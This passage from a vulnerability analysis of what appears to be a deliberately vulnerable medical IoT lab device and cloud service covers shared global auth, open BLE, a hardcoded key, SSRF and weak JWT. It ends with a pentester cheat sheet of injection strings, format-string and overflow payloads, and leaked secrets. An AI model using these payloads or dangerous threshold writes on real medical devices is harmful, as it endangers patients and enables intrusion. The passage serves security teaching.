**Problem:** `authenticated` in `careservice.c` is a global variable (`int authenticated = 0`), not a `socket_fd -> bool` map.

**Impact:**
- Auth on one TCP connection = auth for all TCP connections.
- The Cloud API tries to mitigate this with `_igp_lock` + auth->cmd->deauth, but the lock only serializes requests **from the Cloud API**. An attacker with direct access to `:9999` can connect in the window between `auth` and `deauth`.

**Correct fix:** Bind `authenticated` to the socket file descriptor, not the process.

### 7.2 Nonexistent Trust Boundary in BLE

**Problem:** The entire BLE surface is **completely open**. There is no:
- Pairing/bonding
- Link encryption
- Session authentication
- Device identity verification (only the name is compared)

**Impact:** Any attacker with a $5 BLE dongle can:
- Connect to the device
- Read the WiFi PSK
- Write lethal thresholds
- Execute factory reset
- Redirect cloud registration to their own server

### 7.3 Shared Hardcoded Symmetric Key

**Problem:** `CSCP_KEY = "careotter-key-16"` exists in:
- `ble_server.py` (device firmware)
- `CareOtterConfig.java` (APK Android)
- `forge_threshold.py` (pentest tool)

**Impact:** Compromising a single device or a single APK compromises the entire fleet. The "encryption" provides neither confidentiality nor authentication — it only obscures serialization.

### 7.4 SSRF in the Medical Cloud

**Problem:** `cloud_set` in BLE provisioning accepts any URL without validation. The device automatically sends:
- Its factory signature (12 hex chars, e.g. `9C0C306DEF2A`)
- Admin and patient credentials
- Its WiFi IP

**Impact:** An attacker can set `cloud_url` to a domain they control and receive all onboarding data from the device.

### 7.5 Two-Speed Authentication

**Problem:** There are three independent authentication systems with different strengths:

| Channel | Mechanism | Strength |
|-------|-----------|-----------|
| BLE | None | ⛔ None |
| IGP v4 | Hardcoded token | 🔴 Weak |
| Cloud API | JWT HS256 with weak secret | 🟡 Mediocre |
| Cloud API -> Device | Same hardcoded IGP token | 🔴 Weak |

An attacker can pivot from the weakest channel (BLE, no auth) to the strongest (Cloud API) via `cloud_set` + signature capture.

### 7.6 Sensitive State Persistence Without Expiration

**Problem:**
- `_PROVISION_FILE` (`/tmp/careotter-provision.json`) persists WiFi, cloud, patient, and admin credentials.
- The `initialized_at` field is written but **never checked**. The provisioning channel never expires (vulnerability P8).
- SQLite in Docker persists in the `careotter_data` volume across `docker compose down` (unless `-v` is used).

---

## 8. File Dependency Map

```
careservice.c
    ├── reads/writes: /var/log/careservice.log
    ├── reads/writes: /opt/careotter_events.log
    ├── reads/writes: /var/log/careotter.thresholds  ◄────── sensor_service.py (watcher)
    ├── reads: /etc/config/wireless
    ├── reads: /etc/careotter/alert.conf
    └── executes: /etc/init.d/* (via fork/execv)

sensor_service.py
    ├── reads: /opt/medical-sensor/config.json
    ├── reads: /var/log/careotter.thresholds
    ├── writes: /var/log/medical-logs/vitals.log
    └── uses: simulator.py (or real smbus2)

ble_server.py
    ├── reads/writes: /tmp/careotter-provision.json
    ├── queries: http://127.0.0.1:8081/vitals
    ├── queries: Cloud API /api/health (to obtain wifi_ip)
    └── sends: POST Cloud_API/admin/device/register

Cloud API (app.py)
    ├── queries: http://DEVICE_IP:8081/health (for MAC)
    ├── queries: http://DEVICE_IP:8081/vitals (collector)
    ├── talks to: TCP DEVICE_IP:9999 (IGPClient)
    └── writes: SQLite /app/data/careotter.db

Android App
    ├── talks to: HTTP Cloud_API:5002
    ├── talks to: BLE GATT CareOtter_HR
    └── talks to: TCP 192.168.2.1:9999 (admin mode)
```

---

## 9. Executive Summary for Pentesters

| If you want to exploit... | Use this channel | Key command/payload |
|------------------------|---------------|----------------------|
| Hardcoded credential | IGP v4 | `0x02` + `OtterMobile2026` |
| WiFi PSK disclosure | IGP v4 / BLE | `0x03` or read `0xFF11` |
| Shell injection | IGP v4 / BLE | `0x06` SSID=`'; touch /tmp/pwn #` or `wifi_set` |
| Format string leak | IGP v4 / API | `0x05` module=`%x.%x.%x` or `/api/device/status?module=...` |
| Command injection | IGP v4 | `0x0C` payload=`test'; reboot #` |
| Buffer overflow | IGP v4 | `0x04` TLV `AA FF 44 61 72 6B` |
| BLE threshold attack | BLE GATT | CSCP v1 packet with `bpm_min=0, bpm_max=255` |
| SSRF / Cloud hijack | BLE GATT | `cloud_set` -> attacker URL |
| JWT forgery | Cloud API | Sign with `careotter_jwt_2026` |
| Weak password crack | Cloud API | SHA-256 rainbow table for `CareOtter2026!` |
| RCE in Cloud API | Cloud API | Trigger 500 error in `VULNERABLE=1` -> Werkzeug PIN |
| Unauthorized admin (fallback, out of scope) | Cloud API | `GET /initialize_iot` if DB empty — lab playability only, not an attack chain |
| Privilege escalation | Cloud API | Patient accesses `/api/devices` (no role check) |
